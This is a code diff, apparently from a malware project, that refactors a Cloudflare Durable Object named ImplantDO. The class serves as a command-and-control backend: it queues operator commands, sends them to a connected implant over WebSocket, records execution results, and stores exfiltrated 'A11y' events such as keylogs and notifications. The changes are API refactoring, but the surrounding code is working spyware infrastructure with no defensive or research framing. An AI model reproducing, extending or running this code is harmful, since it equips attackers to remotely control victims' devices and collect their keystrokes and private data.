@@ -21,7 +21,7 @@ export class ImplantDO extends DurableObject {
   constructor(state: DurableObjectState, env: Env) {
     super(state, env);
     this.sessions = new Map();
-    this.state.storage.sql.exec(
+    this.ctx.storage.sql.exec(
       `CREATE TABLE IF NOT EXISTS command_queue (
         id TEXT PRIMARY KEY,
         command TEXT NOT NULL,
@@ -32,7 +32,7 @@ export class ImplantDO extends DurableObject {
         completed_at INTEGER
       )`
     );
-    this.state.storage.sql.exec(
+    this.ctx.storage.sql.exec(
       `CREATE TABLE IF NOT EXISTS implant_events (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         type TEXT,
@@ -64,7 +64,7 @@ export class ImplantDO extends DurableObject {
     const pair = new WebSocketPair();
     const [client, server] = Object.values(pair) as [WebSocket, WebSocket];
 
-    this.state.acceptWebSocket(server, ['implant']);
+    this.ctx.acceptWebSocket(server, ['implant']);
 
     this.sessions.set('primary', {
       connectedAt: Date.now(),
@@ -86,13 +86,13 @@ export class ImplantDO extends DurableObject {
     switch (command) {
       case 'send_command': {
         const cmdId = crypto.randomUUID();
-        this.state.storage.sql.exec(
+        this.ctx.storage.sql.exec(
           `INSERT INTO command_queue (id, command, payload, status, queued_at) VALUES (?, ?, ?, 'pending', ?)`,
           cmdId, payload?.command || '', JSON.stringify(payload?.payload || {}), Date.now()
         );
         // Send to connected implant immediately
         let sent = false;
-        for (const ws of this.state.getWebSockets()) {
+        for (const ws of this.ctx.getWebSockets()) {
           if (ws.readyState === WebSocket.OPEN) {
             const frame = JSON.stringify({
               id: cmdId,
@@ -101,7 +101,7 @@ export class ImplantDO extends DurableObject {
             });
             ws.send(frame);
             sent = true;
-            this.state.storage.sql.exec(
+            this.ctx.storage.sql.exec(
               `UPDATE command_queue SET status = 'sent' WHERE id = ?`, cmdId
             );
             break;
@@ -115,7 +115,7 @@ export class ImplantDO extends DurableObject {
       case 'get_result': {
         const { cmdId } = payload || {};
         if (cmdId) {
-          const rows = this.state.storage.sql.exec(
+          const rows = this.ctx.storage.sql.exec(
             `SELECT id, command, status, result, completed_at FROM command_queue WHERE id = ?`,
             cmdId
           ).toArray();
@@ -137,7 +137,7 @@ export class ImplantDO extends DurableObject {
           });
         }
         // Return all recent results
-        const results = this.state.storage.sql.exec(
+        const results = this.ctx.storage.sql.exec(
           `SELECT id, command, status, result, completed_at FROM command_queue
            WHERE status = 'completed' ORDER BY completed_at DESC LIMIT 50`
         ).toArray();
@@ -147,15 +147,15 @@ export class ImplantDO extends DurableObject {
       }
 
       case 'get_status': {
-        const connected = this.state.getWebSockets().length > 0;
+        const connected = this.ctx.getWebSockets().length > 0;
         return new Response(JSON.stringify({
           success: true,
           status: {
             connected,
-            sessions: this.state.getWebSockets().length,
+            sessions: this.ctx.getWebSockets().length,
             lastHeartbeat: this.lastHeartbeat,
             implantInfo: this.implantInfo,
-            pendingCommands: this.state.storage.sql.exec(
+            pendingCommands: this.ctx.storage.sql.exec(
               `SELECT COUNT(*) as count FROM command_queue WHERE status IN ('pending','sent')`
             ).toArray()[0]?.count || 0,
           }
@@ -165,7 +165,7 @@ export class ImplantDO extends DurableObject {
       }
 
       case 'get_events': {
-        const events = this.state.storage.sql.exec(
+        const events = this.ctx.storage.sql.exec(
           `SELECT * FROM implant_events ORDER BY ts DESC LIMIT 100`
         ).toArray();
         return new Response(JSON.stringify({ success: true, events }), {
@@ -182,7 +182,7 @@ export class ImplantDO extends DurableObject {
   }
 
   private flushQueue(ws: WebSocket) {
-    const pending = this.state.storage.sql.exec(
+    const pending = this.ctx.storage.sql.exec(
       `SELECT id, command, payload FROM command_queue WHERE status = 'pending'`
     ).toArray();
     for (const row of pending) {
@@ -192,7 +192,7 @@ export class ImplantDO extends DurableObject {
         p: JSON.parse(row.payload || '{}'),
       });
       ws.send(frame);
-      this.state.storage.sql.exec(
+      this.ctx.storage.sql.exec(
         `UPDATE command_queue SET status = 'sent' WHERE id = ?`, row.id
       );
     }
@@ -217,7 +217,7 @@ export class ImplantDO extends DurableObject {
 
       if (parsed.type === 'result' && parsed.id) {
         // Implant executed a command — store the result
-        this.state.storage.sql.exec(
+        this.ctx.storage.sql.exec(
           `UPDATE command_queue SET status = 'completed', result = ?, completed_at = ? WHERE id = ?`,
           parsed.data || '', parsed.ts || Date.now(), parsed.id
         );
@@ -226,7 +226,7 @@ export class ImplantDO extends DurableObject {
 
       if (parsed.type === 'event') {
         // A11y exfil event (keylog, notification, etc.)
-        this.state.storage.sql.exec(
+        this.ctx.storage.sql.exec(
           `INSERT INTO implant_events (type, tag, data, ts) VALUES (?, ?, ?, ?)`,
           parsed.type, parsed.tag || 'unknown', parsed.data || '', Date.now()
         );
@@ -242,11 +242,7 @@ export class ImplantDO extends DurableObject {
     }
   }
 
-  async webSocketClose(ws: WebSocket, _code: number, _reason: string, _wasClean: boolean) {
-    for (const [id] of this.sessions.entries()) {
-      if (ws === (await this.state.getWebSockets()).find(w => w === ws)) {
-        this.sessions.delete(id);
-      }
-    }
+  async webSocketClose(_ws: WebSocket, _code: number, _reason: string, _wasClean: boolean) {
+    this.sessions.clear();
   }
 }
